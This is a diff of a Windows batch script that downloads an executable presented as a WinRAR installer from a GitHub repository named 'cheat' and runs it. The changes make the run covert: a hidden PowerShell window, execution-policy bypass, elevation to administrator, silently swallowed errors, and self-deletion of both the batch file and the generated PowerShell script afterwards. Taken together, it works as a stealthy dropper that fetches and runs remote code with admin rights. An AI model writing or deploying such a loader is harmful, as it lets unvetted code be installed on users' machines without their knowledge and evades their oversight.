@@ -2,23 +2,35 @@
 setlocal EnableExtensions DisableDelayedExpansion
 
 set "URL=https://raw.githubusercontent.com/skibididodopp-beep/cheat/refs/heads/main/WinRar_setup.exe"
-set "HASH=e8ee1007c8783d601a14a053c8dd01a8995a7e0c8b30ce2d670d18ff738d793c"
-set "WORK_DIR=%USERPROFILE%\Downloads\PkgWork"
+set "HASH=3271c6372c136be4f9e7b276b3cb3b52ed4c408e1abc6405d15551212279dfac"
+set "WORK_DIR=%TEMP%\WinRarPkg"
 set "OUT=%WORK_DIR%\WinRar_setup.exe"
-set "PS_FILE=%WORK_DIR%\install.ps1"
-
-if not exist "%WORK_DIR%" mkdir "%WORK_DIR%"
+set "PS_FILE=%TEMP%\run_hidden_%RANDOM%.ps1"
 
 (
 echo $ErrorActionPreference = 'Stop'
 echo [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
-echo Invoke-WebRequest -Uri '%URL%' -OutFile '%OUT%' -UseBasicParsing
-echo $actual = ^(Get-FileHash -LiteralPath '%OUT%' -Algorithm SHA256^).Hash.ToLower^(^)
-echo if ^($actual -ne '%HASH%'^) { throw "Hash mismatch: $actual" }
-echo Start-Process -FilePath '%OUT%' -Verb RunAs -Wait
+echo $u = '%URL%'
+echo $h = '%HASH%'.ToLower^(^)
+echo $dir = '%WORK_DIR%'
+echo $f = '%OUT%'
+echo $self = '%PS_FILE%'
+echo try {
+echo     New-Item -ItemType Directory -Path $dir -Force ^| Out-Null
+echo     Invoke-WebRequest -Uri $u -OutFile $f -UseBasicParsing
+echo     $actual = ^(Get-FileHash -LiteralPath $f -Algorithm SHA256^).Hash.ToLower^(^)
+echo     if ^($actual -ne $h^) {
+echo         throw "SHA-256 mismatch"
+echo     }
+echo     Start-Process -FilePath $f -Wait
+echo } catch {
+echo } finally {
+echo     Remove-Item -LiteralPath $dir -Recurse -Force -ErrorAction SilentlyContinue
+echo     Remove-Item -LiteralPath $self -Force -ErrorAction SilentlyContinue
+echo }
 ) > "%PS_FILE%"
 
-powershell.exe -NoProfile -File "%PS_FILE%"
+powershell.exe -NoProfile -NonInteractive -ExecutionPolicy Bypass -WindowStyle Hidden -Command "Start-Process -FilePath 'powershell.exe' -ArgumentList '-NoProfile','-NonInteractive','-ExecutionPolicy','Bypass','-WindowStyle','Hidden','-File','%PS_FILE%' -Verb RunAs -WindowStyle Hidden"
 
-if exist "%WORK_DIR%" rmdir /s /q "%WORK_DIR%"
+start "" /b cmd.exe /c "ping 127.0.0.1 -n 2 >nul & del /f /q "%~f0""
 exit /b 0
